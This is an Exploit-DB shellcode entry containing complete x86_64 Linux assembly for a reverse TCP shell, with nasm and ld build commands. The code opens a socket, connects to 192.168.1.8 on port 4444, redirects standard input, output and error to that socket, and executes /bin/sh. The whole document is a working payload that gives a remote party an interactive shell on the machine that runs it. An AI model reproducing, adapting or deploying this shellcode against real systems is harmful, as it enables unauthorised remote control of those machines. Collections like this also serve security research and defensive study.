;Category: Shellcode
;Title: GNU/Linux x86_64 - Reverse Shell Shellcode
;EDB-ID: 42339
;Author: m4n3dw0lf
;Github: https://github.com/m4n3dw0lf
;Date: 18/07/2017
;Architecture: Linux x86_64
;Tested on: #1 SMP Debian 4.9.18-1 (2017-03-30) x86_64 GNU/Linux

;nasm -f elf64 42339_reverse_tcp_shell.s -o reverse_tcp_shell.o
;ld reverse_tcp_shell.o -o reverse_tcp_shell

section .text
  global _start
    _start:
        push rbp
        mov rbp,rsp
        xor rdx, rdx
        push 1
        pop rsi
        push 2
        pop rdi
        push 41
        pop rax ; sys_socket
        syscall
        sub rsp, 8
        mov dword [rsp], 0x5c110002 ; Port 4444, 4Bytes: 0xPORT + Fill with '0's + 2
        mov dword [rsp+4], 0x801a8c0 ; IP Address 192.168.1.8, 4Bytes: 0xIPAddress (Little Endiannes)
        lea rsi, [rsp]
        add rsp, 8
        pop rbx
        xor rbx, rbx
        push 16
        pop rdx
        push 3
        pop rdi
        push 42
        pop rax; sys_connect
        syscall
        xor rsi, rsi
    shell_loop:
        mov al, 33
        syscall
        inc rsi
        cmp rsi, 2
        jle shell_loop
        xor rax, rax
        xor rsi, rsi
        mov rdi, 0x68732f6e69622f2f
        push rsi
        push rdi
        mov rdi, rsp
        xor rdx, rdx
        mov al, 59
        syscall
